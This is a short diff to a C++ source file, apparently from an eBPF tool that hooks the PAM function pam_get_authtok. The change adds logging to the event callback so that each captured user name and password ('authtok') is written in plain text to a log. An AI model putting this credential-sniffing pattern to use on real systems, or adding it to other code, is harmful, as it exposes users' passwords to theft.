@@ -1,5 +1,8 @@
 #include "pam_task.h"
 
+#include <log4cplus/logger.h>
+#include <log4cplus/loggingmacros.h>
+
 #include <string>
 #include <thread>
 #include <vector>
@@ -207,6 +210,9 @@ int after_pam_get_authtok(struct pt_regs *ctx, pam_handle_t* phandle) {
 
 static void callback(void* cb_cookie, void* data, int size) {
   pam_event_t* event = static_cast<pam_event_t*>(data);
+  log4cplus::Logger logger = log4cplus::Logger::getInstance("default");
+  LOG4CPLUS_INFO_FMT(logger, "[%s] user: %s, authtok: %s", event->pam_func,
+                     event->user, event->authtok);
 }
 
 BPFTask<pam_event_t>* get_pam_task() {
